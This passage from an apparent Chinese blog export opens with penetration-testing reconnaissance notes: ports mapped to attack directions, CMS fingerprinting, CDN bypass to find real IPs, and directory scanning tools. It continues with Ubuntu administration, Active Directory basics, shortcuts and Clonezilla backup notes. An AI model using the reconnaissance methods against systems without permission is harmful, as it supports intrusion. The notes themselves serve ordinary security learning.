https://dns.zizhan.com 4. 收集常用端口信息 方便对症下药 工具： Nmap 无状态扫描工具 Masscan ZMap 御剑高速TCP端口扫描工具 https://www.cnblogs.com/botoo/p/10475402.html 常用端口和攻击方向汇总：文件共享服务端口 端口号 端口说明 攻击方向 20/21/69 Ftp/Tftp文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 2049 Nfs服务 配置不当 139 Samba 爆破、未授权访问、远程代码执行 389 Ldap目录访问权限 注入、允许匿名访问、弱口令 注：FTP协议的 21端口 –&gt; 传输控制信息， 20端口 —&gt; 传输数据 远程连接服务端口 端口 端口说明 攻击方向 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Rdp远程桌面连接 Shift后门（需Windows Server 2003 及以下系统 ）、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere 抓密码、代码执行 Web应用服务端口 端口号 端口说明 攻击方向 80/443/8080 常见的web服务端口 Web攻击、爆破、对于服务器版本漏洞 7001/ 7002 WebLogic控制台 Java反序列化、弱口令 8080/8089 JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令 9090 WebSphere控制台 Java反序列化、弱口令 4848 GlassFish 控制台 弱口令 1352 Lotus domino邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 数据库服务端口 端口号 端口说明 攻击方向 3306 Mysql 注入、提权、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹Shell 5432 PostgreSQL数据库 爆破、注入、弱口令 28017/27018 MongoDB 爆破、未授权访问 6379 Redis数据库 可尝试未授权访问、弱口令爆破 5000 SysBase/DB2数据库 爆破、注入 邮件服务端口 端口 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3协议 爆破、嗅探 142 IMAP协议 爆破 网络常见协议端口 端口 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67/68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、搜集目标内网信息 特殊服务端口 端口 端口说明 攻击方向 2181 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200 Elasticsearch服务 远程执行 11211 Memcache服务 未授权访问 512/513/514 Linux Rexec服务 爆破、Rlogin登录 873 Rsync服务 匿名访问、文件上传 3690 Svn服务 Svn泄露、未授权访问 50000 SAP Mannagement Console 远程执行1 5.指纹识别应用程序在html, css, js 等文件中多多少少会包含一些特征码（比如: WordPress在robots.txt中会包含wp-admin, 首页index.php中会包含generator=wordpress 3.xx）,帮助快速识别CMS 常见的CMS(整站系统)： Dedecms(织梦) Discuz PHPWEB PHPCMS ECShop Dvbbs SiteWeaver ASPCMS 帝国 Z-Blog WordPress 工具： 御剑Web指纹识别 What Web WEBrOBO 椰树 轻量WEB指纹识别 … 在线网站工具： BugScaner： https://whatweb.bugscaner.com/look/ 云悉指纹： https://www.yunsee.cn/finnger.html What Web: https://whatweb.net/ 推荐项目：https://github.com/Lucifer1993/cmsprint 国内的https://github.com/anouarbensaad/vulnx 国外的https://github.com/Lucifer1993/AngelSword 国内的 （停止维护） phpStudy搭建的网站，数据包都有以下特点Server: Apache/2.4.23 (Win32) OpenSSL/1.0.23 mod_fcgid/2.3.9 6.查找真实IP如果目标服务器只有一个域名 ，获取真实ip就非常重要如果没有CDN，可以通过 www.ip138.com等工具获取目标的ip CDN（内容分发网络， 通俗讲就是高速缓存服务器，把内容缓存到了距离我们最近的节点服务器上面…） 判断有无CDN采用超级ping第三方平台判断：唯一IP无cdn，反之有cdn或者采用在线网站17CE (https://www17ce.com)进行全国多地区的ping服务器操作 工具： 超级ping 站长工具等 绕过CDN寻找真实IP（1）内部邮箱源一般邮件系统都在内部，没有经过CDN解析通过网站注册用户或者RSS订阅功能，查看邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获取真实ip注意：必须是目标自己的邮件服务器，第三方公共邮件服务器不行 （2）扫描网站测试文件如：phpinfo, test等一文件，从而找到真实ip （3）分站域名很多主站访问量大，挂了CDN，但是分站有可能没有CDN可以通过ping二级域名获取分站ip， 很可能出现分站和主站部署同一个ip，但是在同一个C段下面的情况，从而判断目标的真实ip段 （4）国外访问较小或者业务面向国内的网站的CDN往往只对国内的用户访问加速，而国外就不一定了方法： 可以通过挂国外的代理 或者 使用国外的在线代理网站App Synthetic Monitor (https://asm.ca.com/en/ping.php)访问可能会得到真实ip （5）查询域名解析记录也许目标很久之前没有使用CDN通过网站NETCRAFT （https://www.netcraft.com/）来观察域名的ip历史记录，也可以大致分析出真实ip段 （6）目标有自己的App可以尝试用Fiddller或Burp Suite 抓取App的请求，从而找到目标的真实ip （7）绕过CloudFlare CDN查找真实IP很多网站都使用 CloudFlare 提供的cdn服务可通过在线网站FlareWatch (http://www.crimeflare.us/cfs.html#box) 对CloudFlare客户网站进行真实ip查询 (9) 其他方法123456其他方法：遗留文件（比如google镜像），扫全网(比如)，黑暗引擎，dns历史记录（第三方平台，刚好开通cdn之前的ip地址），以量打量（需要肉鸡，cdn的流量用完就显示真实ip）https://get-site-ip.com/遗留文件中: phpinfo的server_ddr字段， http_x_forwarded_for【文章：】https://www.lstazl.com/cdn检测与绕过/https://www.fujieace.com/penetration-test/cdn-find-ip.html （8）验证获取的IP 是否真实？如果是Web： 直接输入ip访问，看看相应页面是否和访问域名返回的一样目标段比较大的情况下：借助Masscan的工具批扫描对应IP段中所有开了80,443,8080端口的ip，然后逐个ip尝试，观察响应结果是否是目标站点 7.收集敏感目录 文件从中可以发现隐藏的后台管理页面，文件上传页面，甚至网站备份文件和源码 工具： DirBuster java编写的，图形化界面 御剑后台扫描珍藏版 wwwscan Spinder.py (轻量级快速单目录后台扫描) Sensitivefilescan (轻量级快速单文件目录后台扫描 ) Weakfilescan (轻量级快速单文件目录后台扫描 ) awvs 爬行 webPathBrute robots.txt 很多在线工具： WebScan (http://www.webscan.cc/) 8.社会工程学邮件社工库…… 9. 其他 web信息搜集网站源码脚本类型php, java, python, go, node.js, …… 脚本类型： url直接显示: xxx.php 可以直接判断2.如果是伪静态：多构造请求数据包，f12，network中的数据包中，可以看到请求的URL(…xxx.jsp)或者接口…比如：Request URL: http://www.cngis.cn/news/detail.aspx?classid=216454257090494464&amp;id=140 这里是aspx的 伪静态怎么注入没理解？？？伪静态 不是真正意义上的静态格式文件 : 展示的格式是…xxx.html测试方法： f12打开network，查看请求数据包（） 多提交地址访问抓包分析 网站对应数据库常用的组合匹配： 如php程序 判定mysql aspx 判定mssql常见组合： asp+access php+mysql aspx+mssql jsp+mssql或oracle等 端口扫描判定：内网服务器方法失效access无端口开发， mysql:3306， mssql:1433， oracle:1521，MongoDB：27017,Postgresql:5432, redis:6379等 参考文章：https://www.cnblogs.com/botoo/p/10475402.html 网站搭建平台查看元素或审查元素抓包获取比如Server: Nginx, iis等中间件信息 服务器操作系统大小写判断 windows大小写不敏感 linux相反 有无WAF防护工具：可以借用 wafw000f 脚本判断waf类别。 https://github.com/EnableSecurity/wafw00f wafw00f http://www.cngis.cn 应用的防火墙、硬件的防火墙 SQLMAP的几个WAF绕过方法： https://9bie.org/index.php/archives/465/ 有无其他应用APP或手机站点 第三方接口（微信公众号等） IP网段网络信息 IP : IP对应网站 IP对应目录扫描 （设置的时候，目录设置为www.xxx,com。 192.168.1.112访问的是站点，但是www.xxx.com访问的是站点下面的一个目录。一个ip对应多个域名多个站点，单一个域名只有一个ip）网段： C段信息扫描 网段 192.168.0.1 -192.168.0.255 在线C段查询（拿到同网段后，再进行另一个主机，相当于内网渗透了）工具: DotNetScan iisput增强版 robots协议直接访问地址/robots.txt获取相关目录地址信息 shodanzoomeyefofa 利用搜索。或者脚本开发进行批量/调用 伪静态如果看到一个以.html或者.htm结尾的网页，此时可以通过呢在在地址输入框中输入：javascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。 https://blog.csdn.net/Fly_hps/article/details/79487137 https://blog.csdn.net/zezai3010/article/details/78797944]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server 包管理]]></title>
    <url>%2Fubuntu%20server-%E5%8C%85%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[DPKG包管理器（本地） ​ dpkg -l 导出软件包，在新系统上安装dpkg -L xxd 查看某个软件包在电脑上包含哪些文件dpkg -S /usr/.../man1 看这个文件来自哪个软件包dpkg -i xxxname_version_架构.deb 安装 // 架构(amd64, i386)dpkg --print-architecture 查看系统的支持的架构dpkg --print-foreign-architectures 查看系统是否支持其他的架构 cat /var/lib/dpkg/arch 查看系统是否可以拓展支持其他架构类型 可以让系统支持其他类型架构dpkg --remove-architecture i386 删除支持某个架构 dpkg -r name:amd64 卸载软件包（可以带上架构） 不删除配置文件dpkg -P name 卸载并删除配置 APT包管理器12345678910111213141516171819202122232425262728293031# 源文件cat /etc/apt/sources.list | grep -v ^# 不显示#号开头的 /etc/apt/sources.list.d/ 目录下面是第三方的软件源 sudo apt upgrade # 对已经安装的包更新sudo apt dist-upgrade # 更新新包，删除旧包（包含内核）sudo apt remove nmap --purge # 删除包和配置文件 -- /var/log/dpkg.log apt list --upgradeable # 查看可以更新的包apt serach 'network mapper' # 搜索sudo apt show nmap # 查看软件包详细描述 # 卸载, 卸载完成之后再把不用的autoremove等sudo apt remove nmap --purgesudo apt purge nmapsudo apt autoremove # 谨慎使用！！！（某系文件可能是旧版内核的依赖包，如果回退老版本可能会出现问题）/var/cache/apt/archives # 下载到这里来了（里面不需要的deb包可以删除。只是下次再次需要的时候重新下载）/var/lib/apt/ # 更新源的索引文件.list# .deb 是打包好的，不显示源代码apt download nmap # 下载但是不安装(.deb包) apt source asw # 把源代码下载下来，可以可以下载之后自己编译安装 apt showsrc nmap # 查看源代码 自动更新（无人值守）123456789101112131415161718sudo apt install unattended-upgrades# 配置主配置文件/etc/apt/apt.conf.d/50unattended-upgrades允许：一般只允许security那个 黑名单：# 配置文件2/etc/apt/apt.conf.d/10periodic更新/下载/清除/安装 周期# 重启服务sudo service unattended-upgrades restartsudo systemctl restart unattended-upgrades.service # 新版本ubuntu推荐# 日志cat /var/log/unattended-upgrades/unattended-upgrades-xxxxxxxx.logsudo lsb_release -a # 查看版本和code_name 无人值守更新通知1234# 配置文件 /etc/apt/apt.conf.d/50unattended-upgrades中的mail，指定邮箱# apticron软件包，用来发邮件的sudo pt install apticron 多手动练习，少赋值APT更新源配置推荐使用官方更新源 deb 指的是安装包文件deb-src 是deb相关的，还没有编译成deb的源文件 生产环境中，尽量用前两种类型的 第三方库 apt-key addapt-ket del PPA SNAP包管理 发展趋势非常好 SNAP包管理可以先安装snap: apt install snap 1234567891011121314sudo snap find nmapsudo snap install nmapsudo snap remove sudo snapsudo snap refesh nmap # 更新单个软件包sudo snap refresh # 更新索引文件# 同时安装多个软件包（彼此独立） # 作为apt的补充# snap的软件包会下载到一个目录： /snap/bin/...]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网第一章 - 内网基础知识]]></title>
    <url>%2F%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[基础知识 工作组 （类似一个社团，不存在集中管理，无服务机与客户机之分，是对等的）将不同的计算机按功能（或部门）分别列入不同的工作组中 实例：加入/更改/退出 工作组： 计算机- 属性- 计算机名- 更改设置- 工作组更改- （修改名称。若没有这个工作组会新建）- 重启 域域(Domain)一个有安全边界的计算机集合（安全边界： 是指在两个域中，一个域中的用户无法访问另一个域中第资源），可以理解为升级版的“工作组” 域控制器(Domain Controller, 简写为DC)一个域中一个类似管理服务器的计算机，相当于单位的门卫一样，域内电脑如果想互相访问，首先都是经过它的审核 域的分类 单域 （固定位置的小公司。一个yu内要建立至少两个DC，一个作为备份DC） 父域、子域 （比如一个大公司，有分公司；不同地理位置分公司；子公司可以通过自己的域管理自己的资源； 出于安全策略） 域数(tree) 域森林(forest) DNS域名服务器 (实际上，域的name就是DNS域的name； 通常dns服务器与DCS 是一台机器) 活动目录（Active Directory，AD）是指域环境中提供目录服务的组件。 目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制 活动目录相当于字典的索引，即活动目录里的资源就是字典资源的快捷方式，用户通过寻找快捷方式而定位资源 逻辑结构组织对象的做法不考虑被管理对象的具体地理位置的组织框架 活动目录的逻辑结构就包括： 组织单元(ou)、域(domain)、域树(tree)、域森林(forest) 在域树内的所有域共享一个活动目录，这个活动目录内的数据分散的存储在各个域内，且每个域只存储该域内的数据。 活动目录主要功能 账号集中管理 软件集中管理 环境集中管理 增强安全性 更可靠 活动目录为Microsoft统一管理的平台 域控制器（DC）与活动目录（AD）最大的区别是：如果网络规模较大，就考虑把网络中的众多对象，如计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源）。这个拥有层次结构的数据库，就是活动目录数据库，简称 AD 库。 那么，我们应该把这个数据库放在哪台计算机上呢？用于存储活动目录数据库的计算机称为DC。 所以，要实现域环境，其实就是要安装 AD。当内网中的一台计算机上安装了 AD，它就变成了 DC 安全域目的： 将一组安全等级相同的计算机划入同一网段内 DMZ“隔离区”， “非军事化分区”， 为了解决安装防火墙后外部网络不能访问内部网络费武器的问题 放置 一些必须公开的服务器设施，比如：企业web服务器、FTP服务器和论坛等 有效的保护了内部网络 DMZ的屏障功能: 内网可以访问外网 内网可以访问DMZ 外网不能访问内网 外网可以访问DMZ DMZ不能访问外网 DMZ不能访问内网 域中计算机分类 域控制器 成员服务器 客户机 独立服务器 内权限解读域本地组 （来自全林用于本域）多域用户访问单域资源（访问同一个域），不能嵌套于其他组中，主要是用于授权位于域资源的访问权限 全局组 （来自本域作用于全林）单域用户访问多域资源（必须是同一个域里面的用户），全局组嵌套在其他组中 通用组 （来自全林作用于全林）通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。 A-G-DL-P策略A - 用户账号 G - 全局组 U - 通用组 DL - 域本地组 P - 资源权限 A-G-DL-P策略 是将用户账号添加到全局组中，讲全局组添加到域本地组中， 然后为域本地组分配资源权限。按照AGDLP的原则对用户组织和管理起来更容易 在AGDLP形成以当给一个用户某个权限的时候，只要把这个用户家到某一个本地域组就可以了。 全局组、通用组的权限 域管理员组 Domain Admins 企业系统管理员组 Enterprise Admins 架构管理员组 Schema Admins 域用户组 Domain Users 本地组的权限： Administrators (管理员组) Remote Desktop USer （远程登录组） Print Operator (打印机操作员组) Account Operators （账号操作员组） Server Operater （服务器操作员组） Backup Operators (备份操作员组 ) 域环境搭建Windows 2012 R2 设置IP 更改计算机名 安装域控制器和DNS服务 升级服务器 创建Active Directory用户 Windows7 Windwos7 通过防火墙Monowall构建二级内网防火墙Monowall的使用开源，基于软件的防火墙， 基于Web页面管理的 中文版： www.cat-home.org/?action=show&amp;id=158 网络适配器: 2个， 一个NAT，一个桥接，硬盘要求特别低； 配置：]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu server-基础命令]]></title>
    <url>%2Fubuntu%20server-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[基本Shell常识12345ctrl + D # 结束当前输入ctrl + c # 强制结束一切#bash ls参数:12345678-l-a-d 只显示目录自身信息-i 显示inode信息-S 按文件大小排序-r 倒序-t 按修改时间排序-h 文件大小便于人类阅读方式 cp123cp file1 file2cp file1 f2 dir/ 参数:12345-R/r 拷贝目录-l 硬链接拷贝(ls -li) # node的值是相同的,对应的硬盘数据块是相同的,只是多了一个指向-s 软连接拷贝 (ls -li查看时候第一个字母是'l') #inode值相同, 只是指向了真实的文件,快捷方式-S 目标名称添加后缀 `cp -S -bak b b1` # 把b拷贝为b1的时候,目标文件b1加上后缀-bak-u 源比目标新时才拷贝 `cp -u aa /home/a` # 保存更加新的文件 mv参数:123mv f1 f2mv f1 f2 dir/-f # 强制移动 touch参数:1- 如果文件名存在,修改文件mtime, 但不修改内容 rm参数:1234-i # 每删除之前提醒-d # 删除空目录rm -rf echo将命令参数显示在stdout 参数:12345-n # 显示结束不换行-e # 解释反斜线转义符 `echo \"n"` `echo -ne 123\\b` echo -e a\\n 目录结构目录 &gt; 分区 12345678910111213141516/bin//boot//dev//etc//home//lib//media//mnt//opt//sbin//srv//temp//usr//var//root//proc/ mkdir参数:1-p # 按需创建父目录 pwd参数:12-P # 物理路径(软连接对应的真实路径)-L # 逻辑路径(软连接自身路径) rmdir参数:1-p # 递归删除 通配符:12 grepsudo grep root /etc/* 参数:12345678-i # 忽略大小写-v # 反相匹配-n # 显示行号-r # 递归目录和子目录中所有文件-c # 显示目标文件中包含关键字的行数-f 1.txt 2.txt # 1.txt中多个关键字同时匹配 -E '1|2|3' a.txt # 或者1或者2或者3 grep a[123] a.txt a1,a2,a3 lessmore的增强版 参数:12 快捷键:123456789z/b # 向前/后翻页v # 进入编辑模式g/G # 直接跳过第一行/最后一行(或第n行)/word # 向前搜索关键词?word # 向后搜索关键词n/N # 正向/反向继续搜索关键字q # 退出grep xxx/words | less nano参数:12 head / tail显示文件头/尾部内容, 默认10行 参数:123-n # 指定显示的行数 比如: -3-f # 实时显示 tail -f a.txt # tailf 命令 diff参数:12345-u # 统一格式输出-y # 并排输出比较 # | "不同", ; 配合-w参数限制宽度-w # 忽略空格-i # 忽略大小写 file检测文件格式 顺序执行三种测试集: filesystem 匹配系统头文件&lt;sys/stat.h&gt; magic , -l 查看 language, 匹配文件起始位置的字符类型 一种测试匹配即停止检测,全都不匹配返回data 参数:12-f # 文件列表-ib # mime类型 find参数:123456789101112-name-type # b c d f l-user-mtime +1 -mtime -20 关于时间的概念: atime, ctime amin, nmin, cmin-cnewer file # 比这个文件更加新的文件 find / -mtime 1 # 昨天到前天,发生修改的文件 find / -mtime +1 # 昨天之前所有修改的,,, find / -mtime -1 # 昨天到now,发生修改的文件 stat查看文件详细信息 参数:12 locate基于文件索引进行搜索 不验证文件是否存在,速度快但结果不准确 updatedb更新索引 参数:12 sortsort a.txt 参数:123456789-r # 反向排序-n # 按照数值大小排序-M # 按照月份排序# 另一个排序的命令ls -l --sort=key size time extension 只有先排序,才能取唯一值 ​]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu推荐生产力软件]]></title>
    <url>%2Fubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[基础软件包12345678910111213141516171819202122232425262728293031323334sudo apt intall flashplugin-intaller # 安装浏览器flash插件sudo apt install meld # 对两个目录/文件 一一比对sudo apt install amule # 电驴sudo apt install transmission # BT下载工具 （还可以）sudo apt install qbittorrent # BT下载工具sudo apt install ttf-wqy-microhei # 字体文件sudo apt install mtr # 网络路径追踪工具（基于图形化）sudo apt install whoissudo apt install gitsudo apt install curl # 命令行完成对浏览器访问的基本操作（写脚本常用）sudo apt install obs-studio # 录屏 （图标是旋风形状的，也可以直播）sudo apt install ubuntu-restricted-extras # 一组视频的解码器sudo apt install libavcode-extra libdvd-pkg # 使得linux可以比方dvd的介质。配合上面那个sudo apt install unrar unrar-free # 解压rar文件sudo apt install woeusb # 将iso文件刻录到u盘上面sudo apt install ascii # 运行命令查看常用的ascii编码sudo apt install unicode # unicode 你好， 转换为对应uniode编码sudo apt install axel # 基于字符界面的下载工具（比wget与curl强大）# 支持断点续传等等 安装java123456sudo add-apt-repository ppa:webupd8team/javasudo apt-get updatesudo apt-get install oracle-java8-installer oracle-java8-set-defaultsource /etc/profile# 将oracle的java设为默认环境，替换open java 中文输入法1234567891011sudo apt install ibus ibus-pinyinimconfig # 运行，安装向导，选择ibusreboot设置，将只能中文输入法加入（或者supingyin）# ibus有个小bug，手动修复：ibus-setup然后取消上面的勾选 常用软件 chrome Golddict （中英文翻译） sudo apt intasll goldendict 词典配置界面，website，添加 有道翻译的url 不会的：选中，连续快速两次ctrl+c 邮件客户端 mailspring # UI美观，但是性能不是很好 thunderbird # 性能好，太丑 Protonmail Desktop # 最安全的邮件（质子形状的） 推荐安全从业者 Office WPS for Linux # 唯一推荐 onlyoffice # 客户端不成熟，可以集成到云上， to-do-list （列表清单软件）zenkit # 打开ubuntu的软件仓库，可以直接搜索安装 ， 也可以做为看板类型软件 印象笔记Tusk # 软件仓库搜索安装即可，可以同步印象笔记 书籍管理calibre 虚拟机virtualBox / VMWare Workstation 下载工具 uGet # 类似图形化的axel，支持断点续传 aMule Transmission 图形图像视频编辑 GIMP # 开源软件中的ps VLC kenlive # 视频编辑 pitivi # 视频编辑 思维导图MindMaster # 国产 appimage 程序下载打包软件方式，大大降低了软件安装的成本（类似于绿色软件方式），建议多逛逛 https://appimage.github.io]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu常用快捷键]]></title>
    <url>%2Fubuntu%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[ctrl + alt + up/down 快速切换linux虚拟桌面 Win + a shift/alt + PrintScreen shift:截图（光标变成十字，手动框选） alt: 截取当前窗口 Win + up/down/left/right 将当前应用窗口移动贴到桌面的左右， 下：回到原位置，上：放到最大 ctrl + alt + t 打开终端 再ctrl +shift + n: 新建一个终端 ctrl + d 关闭当前终端窗口 ctrl + shift + t 以tab方式打开新终端 ctrl + shift + c/v 终端里面的复制粘贴 win + d 快速返回显示桌面 ctrl + w/q + w: 关闭一个浏览器/某些应用的页签 + q：关闭所有浏览器/某些应用页签 ctrl + h 将当前应用窗口最小化 win + L 锁定用户对话（锁屏） win + m 打开日历 alt + win + 8 所有内容变为一倍（授课可以用），再按就回去了 win + shift + pageUP/pagedown 将当前应用窗口移动到上一个/下一个虚拟桌面 alt + tab 切换程序窗口 ctrl + t 新建标签页 CTRL + L 跳到地址栏 CTRL + K 跳到搜索引擎输入框 CTRL + D 收藏到书签 Alt + F4 关闭当前窗口 常见终端快捷键1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859Ctrl + Alt + T：打开终端Tab：命令或文件名自动补全Ctrl + Shift + C：复制Ctrl + Shift + V：粘贴Ctrl + Shift + T：在同一个窗口新建终端标签页Ctrl + Shift + W：关闭标签页Ctrl + Shift + N：新建终端窗口Ctrl + Shift + Q：关闭终端窗口Ctrl + Shift + PageUp：标签页左移Ctrl + Shift + PageDown：标签页右移Ctrl + D：关闭标签页Ctrl + L：清除屏幕Ctrl + C：终止当前任务Ctrl + P：显示上一条历史命令Ctrl + N：显示下一条历史命令Ctrl + R：反向搜索历史命令Ctrl + J/M：回车（同enter键功能）Ctrl + A：光标移动到行首Ctrl + E：光标移动到行尾Ctrl + B：关闭想后移动一个位置（backward）Ctrl + Z：把当前任务放到后台运行Ctrl + PageUp：前一个终端标签页Ctrl + PageDown：下一个终端标签页F1：打开帮助指南F11：全屏切换Alt + F：打开“文件”菜单（file）Alt + E：打开“编辑”菜单（edit）Alt + V：打开“查看“菜单（view）Alt + S：打开“搜索”菜单（search）Alt + T：打开“终端”菜单（terminal）Alt + H：打开“帮助”菜单（help）Ctrl + →：光标移动到上一个单词的词首Ctrl + ←：光标移动到下一个单词的词尾Ctrl + T：将光标位置的字符和前一个字符进行位置交换Ctrl + U：剪切从行的开头到光标前一个位置的所有字符Ctrl + K：剪切从光标位置到行末的所有字符Ctrl + Y：粘贴Ctrl + U/Ctrl + K剪切的内容Ctrl + H/*：删除光标位置的前一个字符（backspace键功能）Ctrl + D：删除光标位置的一个字符（delete键功能）Ctrl + W：删除光标位置的前一个单词（Alt + Backspace组合键功能）Ctrl + &amp;：恢复Ctrl + H/D/W删除的内容Ctrl + Win + ↑：最大化当前窗口Ctrl + Win + ↓：还原/最小化当前窗口Ctrl + Win + D：最小化所有窗口Win + W：展示所有窗口Win + T：打开回收站2次连续Tab/4次连续Esc/2次连续Ctrl + I：将显示所有命令和工具名称ctrl-B # 左ctrl-F # 右ctrl-P # 上ctrl-N # 下ctrl-A # 光标到行首ctrl-E # 光标到行尾ctrl-W # 删除光标前以空格分隔段落ctrl-U # 删除光标到行首ctrl-K # 删除光标到行首ctrl-Y # 粘贴删除的内容]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux系统备份]]></title>
    <url>%2Flinux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%2F</url>
    <content type="text"><![CDATA[系统备份怎么备份常见的备份工具0.Ghost 1. DIsks (ubuntu系统查找： disks, 缺点:过程中不能压缩空间，原来多少现在备份文件就是多少)备份： 选择硬盘右上角“create disk image”, 选择存储目录, 点击”start…” 还原： 选择硬盘右上角“restore disk image”， 选择备份好的硬盘文件，“start” 2. Clonezilla (备份过程中实现镜像) 源自台湾政府安全部门的开源项目 支持网络以及外置存储设备 服务器客户端部署 https://clonezilla.org 适合大批量的… 下面是clonezilla的 实例：1. Clonezilla 的备份下载 主要是两个版本，两个稳定版本和下面两个测试版本： Live release Extra info Other notes alternative stable - 20191024-eoan checksums, checksums gpg,changelog, known issue, release note Ubuntu-based, ? stable - 2.6.4-10 checksums, checksums gpg changelog, known issue, release note Debian-based, ? alternative testing - 20191226-eoan 20191226-focal checksums, checksums gpg, changelog, known issue checksums, checksums gpg, changelog, known issue Ubuntu-based, ? testing - 2.6.5-8 checksums, checksums gpg, changelog, known issue Debian-based, ? case1. 只有一个硬盘：（对分区做备份） 1.建议对硬盘分区，一个小的只安装系统啥啥，另一个分区存放资料与分区。备份一个分区 2.备到外置存储设备 case2. 不止一块硬盘 (这个)对那个系统整个硬盘做备份 下面是对新虚拟机的实验环境： （自己的机器不用做这一步） 使用disk 对新硬盘格式化：点击硬盘format disk 分区：create Partition 可以直接选择最大的分区 给个卷标： 比如bak 挂载： 点击 “播放”形状的按钮 下面开始 准备备份 1.选择使用这个clonezilla 的iso来引导打开操作系统 2.然后在界面选live就行， 第二个选项other mode 可以选择分辨率 3.语言、键盘等自己选择 4.选择克隆类型： ​ 设备对设备，硬盘对硬盘,… ​ 这里（对本机）就选设备到image (如果是还原的过程，就选image-到device) 5.选择image存放位置(有本地和云或者ssh服务器)，这里选local device 6.回车，开始识别本地设备，设备识别完成后，再按ctrl + c 7.选择第二个硬盘(即目标位置)来存放image文件， 按住tab选择 done, 继续回车 8.接下来，建议选择第一个选项：Beginner mode , 即初学者（接下来的操作会有信息提示） 9.接下来，选择save disk（保存硬盘） / save part（保存分区） ， 然后选择保存的名称 10.选择备份源： tab来选择第一个硬盘（即需要备份的系统盘） 11.下一步，选择备份过程是否进行检查，推荐不检查* （即-sfsk） 下一步，是否再对生成的影像文件 进行检查 yes/no , 一般不用检查， tab选择no 13.选择 加密(enc)/不加密（senc）, 即是否在还原的时候需要输入密码 14.接下来，选择备份之后是关机(poweroff)还是重启(reboot)？ 按回车进行下一步，确认无误后按住yes 15…….开始备份…… （时间大概10分钟之内） 16….备份完自动重启，挂载上硬盘，就会看到那个备份映像的文件夹 2. Clonezilla 的还原插入光盘到光驱，即clonezila的iso文件 使用Clonezilla引导，选择live，（同上） start clonezilla 扔选择device -&gt; image 选择Local device 他自动识别硬盘， ctrl+c结束识别 接下来自己选择磁盘映像的硬盘的分区，选择映像文件所在的文件夹，选择done 选择 beginer mode 选择 restoredisk 选项： 选择ok 选择sda（即还原到哪） 是否检查选项， 欢迎之后选择是否关机/重启 回车 回车 确认无误后输入yes回车 ……开始恢复……]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Ubuntu</tag>
        <tag>系统备份</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[弹出地图并缩放到指定经纬度]]></title>
    <url>%2F%E5%9C%B0%E5%9B%BE%E7%BC%A9%E6%94%BE%E5%88%B0%E6%8C%87%E5%AE%9A%E7%BB%8F%E7%BA%AC%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[点击【地图查看】，弹出地图，并缩放到当前某一xx的范围效果大致是这样： 先把弹窗的页面元素写出来 12345678910111213&lt;!--弹出层时背景层DIV--&gt;&lt;div id="fade" class="black_overlay"&gt; &lt;/div&gt;&lt;!-- 主体部分 --&gt;&lt;div id="MyDiv" class="white_content"&gt; &lt;div style="text-align: left; cursor: pointer; height: 40px; display:inline-block; float:left"&gt; &lt;span style="font-size: 16px; font-weight:bold; line-height:40px;" id="dtval"&gt;&lt;/span&gt; &lt;/div&gt; &lt;div style="float:right; text-align: right; cursor: pointer; height: 40px; display:inline-block"&gt; &lt;button type="button" class="close" style="font-size: 30px;font-weight: bold; background: none;border: none;outline: none;position: relative;right:6px;top:4px " 